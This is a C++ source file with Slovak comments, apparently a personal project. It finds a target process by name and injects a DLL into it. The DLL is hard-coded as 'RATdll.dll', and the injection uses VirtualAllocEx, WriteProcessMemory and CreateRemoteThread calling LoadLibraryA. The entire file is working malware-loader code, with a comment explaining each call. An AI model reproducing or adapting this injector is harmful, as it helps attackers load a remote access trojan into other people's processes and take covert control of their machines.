#include "header.h"

DWORD findPID(const WCHAR* procName) {

	HANDLE procHandle = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);	// vytvori handle na process, SNAPPROCESS je ta specifikacia ze procesu
	PROCESSENTRY32 procInfo;												// struktura ktora obsahuje informacie o procese, hlavne PID ktory potrebujeme
	procInfo.dwSize = sizeof(PROCESSENTRY32);								// musime inicializovat aby isiel Process32First

	if (Process32First(procHandle, &procInfo) == TRUE) {					// zoberie prvy snapshot

		while (Process32Next(procHandle, &procInfo) == TRUE) {				// cyklus v ktorom hladame spravny proces
			if (wcscmp(procName, procInfo.szExeFile) == 0) {
				CloseHandle(procHandle);
				return procInfo.th32ProcessID;								// vrati PID
			}
		}
	}

	else {
		std::cout << "Process32First cannot write into buffer";
		return 0;
	}

	std::cout << "Didnt find process";
	return 0;
}

BOOL InjectDLL(DWORD procID) {

	LPCSTR dllPath = "D:\\Desktop\\RATdll.dll";

	// vytvori HANDLE na process kde chceme vykonat injection
	HANDLE procHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, procID);											// PROCESS_ALL_ACCESS - mozeme vytvarat thready, terminovat process atd...
	if (!procHandle) {
		std::cout << "Cannot obtain handle";																	// NULL - velkost regionu v bajtoch, ked NULL tak vytvorime novy region tam kde zacal stary
	}																											// FALSE - process nededi HANDLE
																												// procID - pre ktory process chceme ziskat HANDLE

	// alokuje miesto vo virtualnej pamati procesu
	LPVOID pDllPath = VirtualAllocEx(procHandle, NULL, strlen(dllPath) + 1, MEM_COMMIT, PAGE_READWRITE);		// procHandle - HANDLE procesu v ktorom chceme alokovat miesto
	if (!pDllPath) {
		std::cout << "Allocation failed";																		// NULL - velkost regionu v bajtoch, ked NULL tak vytvorime novy region tam kde zacal stary
	}																											// strlen - velkost ktoru chceme alokovat
																												// MEM_COMMIT - typ alokacie pamate, nechapem tomu moc...
																												// PAGE_READWRITE - mozme citat a zapisovat do pamate

	// zapise dllPath do pamati procesu ktoru sme alokovali
	WriteProcessMemory(procHandle, pDllPath, (LPVOID)dllPath, strlen(dllPath) + 1, NULL);					// procHande - HANDLE na proces
																											// pDllPath - pointer na zaciatok pamate ktoru sme alokovali
																											// dllPath - pointer na subor ktory chceme zapisat
																											// strlen - velkost suboru ktory chceme zapisat
																											// NULL - pretoze nechceme sledovat kolko bajtov sme zapisali do pamate
	// vrati adresu LoadLibraryA
	LPVOID LoadLibraryAddr = GetProcAddress(GetModuleHandleA("Kernel32.dll"), "LoadLibraryA");

	// vytvori novy thread v procese ktory zavola LoadLibraryA aby nacitala nase DLL
	HANDLE thread = CreateRemoteThread(procHandle, 0, 0, (LPTHREAD_START_ROUTINE)LoadLibraryAddr, pDllPath, 0, 0);
	if (!thread) {
		std::cout << "Failed to create new thread";
	}																										// NULL - default security attribut																										// NULL - novy thread pouziva predvolenu velkost stacku ako .exe
																											// GetProcAddress - reprezentuje zaciatocnu adresu vykonavania threadom,
																											// *GetProcAddres vrati adresu funkcie z DLL ktoru chceme spustit(LoadLibraryA)
																											// pDllPath - pointer na premennu ktoru chceme pouzit ako argument threadu
																											// NULL - thread sa spusti rovno po vytvoreni
																											// NULL - pointer na premennu kam chceme ulozit thread ID

	// pocka kym thread zavola DLL
	WaitForSingleObject(thread, INFINITE);


	//uvolni alokovanu pamat pre dllPath
	VirtualFreeEx(procHandle, pDllPath, strlen(dllPath) + 1, MEM_RELEASE);
	return 0;
}